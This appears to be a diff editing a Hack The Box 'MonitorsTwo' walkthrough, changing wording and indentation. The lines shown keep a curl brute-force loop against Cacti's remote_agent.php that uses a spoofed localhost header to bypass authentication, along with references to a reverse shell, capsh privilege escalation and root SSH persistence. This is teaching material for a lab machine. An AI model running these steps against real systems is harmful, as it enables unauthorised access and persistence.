@@ -262,17 +262,17 @@ values, so let's bruteforce them:
 
 ```sh
 ❯ for i in {1..10}; do \
-    for j in {1..10}; do \
-      RESPONSE=$(curl -s -H "X-Forwarded-For: 127.0.0.1" "http://10.10.11.211/remote_agent.php" -G --data-urlencode "action=polldata" --data-urlencode "host_id=$i" --data-urlencode "local_data_ids[]=$j" --data-urlencode "poller_id="); \
-      if [ "$RESPONSE" != "[]" ]; then \
-        RRD_NAME=$(echo "$RESPONSE" | jq -r '.[0].rrd_name'); \
-        if [[ $RRD_NAME == "polling_time" || $RRD_NAME == "uptime" ]]; then \
-          HOST_ID="$i"; \
-          LOCAL_DATA_ID="$j"; \
-          break 2; \
-        fi; \
-      fi; \
-    done; \
+      for j in {1..10}; do \
+          RESPONSE=$(curl -s -H "X-Forwarded-For: 127.0.0.1" "http://10.10.11.211/remote_agent.php" -G --data-urlencode "action=polldata" --data-urlencode "host_id=$i" --data-urlencode "local_data_ids[]=$j" --data-urlencode "poller_id="); \
+              if [ "$RESPONSE" != "[]" ]; then \
+                  RRD_NAME=$(echo "$RESPONSE" | jq -r '.[0].rrd_name'); \
+                  if [[ $RRD_NAME == "polling_time" || $RRD_NAME == "uptime" ]]; then \
+                      HOST_ID="$i"; \
+                      LOCAL_DATA_ID="$j"; \
+                  break 2; \
+              fi; \
+          fi; \
+      done; \
   done
 ```
 
@@ -292,12 +292,12 @@ www-data@50bca5e748b0:/var/www/html$
 
 It caught the reverse shell!
 
-### Stabilizing the shell
+### Spawning a tty
 
-I'll use this one-liner to stabilize a bit the shell by spawning a tty:
+Let's use this one-liner to spawn a tty:
 
 ```sh
-script "/dev/null" -qc "/bin/bash"
+/usr/bin/script "/dev/null" -qc "/bin/bash"
 ```
 
 ## System enumeration
@@ -348,12 +348,12 @@ www-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid="0" --uid="0" --
 
 Yay!
 
-### Stabilizing the shell
+### Spawning a tty
 
-I'll use this one-liner to stabilize a bit the shell by spawning a tty:
+Let's use this one-liner to spawn a tty:
 
 ```sh
-script "/dev/null" -qc "/bin/bash"
+/usr/bin/script "/dev/null" -qc "/bin/bash"
 ```
 
 ## System enumeration
@@ -369,7 +369,7 @@ set -ex
 
 wait-for-it db:3306 -t 300 -- echo "database is connected"
 if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
-    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
+    mysql --host=db --user=root --password=root cacti </var/www/html/cacti.sql
     mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
     mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
 fi
@@ -950,7 +950,7 @@ Monitor Two
 Security Team
 ```
 
-An adminstrator warns us that three vulnerabilites were recently discovered and
+An administrator warns us that three vulnerabilites were recently discovered and
 might affect our system.
 
 The [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091) looks
@@ -1024,12 +1024,13 @@ bash-5.1#
 
 Yay!
 
-### Stabilizing the shell
+### Establishing persistence
 
-Our home folder contains a `.ssh` directory. There's no existing private key, so
-I'll create one and add the corresponding public key to `authorized_keys`, and
-then I'll connect over SSH to MonitorsTwo. This way, I'll have a much more
-stable shell.
+Let's use SSH to establish persistence.
+
+Our home folder contains a `.ssh` folder. There's no existing private key, so
+I'll create one, and I'll add the corresponding public key to `authorized_keys`.
+Finally, I'll connect over SSH to MonitorsTwo as `root`.
 
 ## System enumeration
 
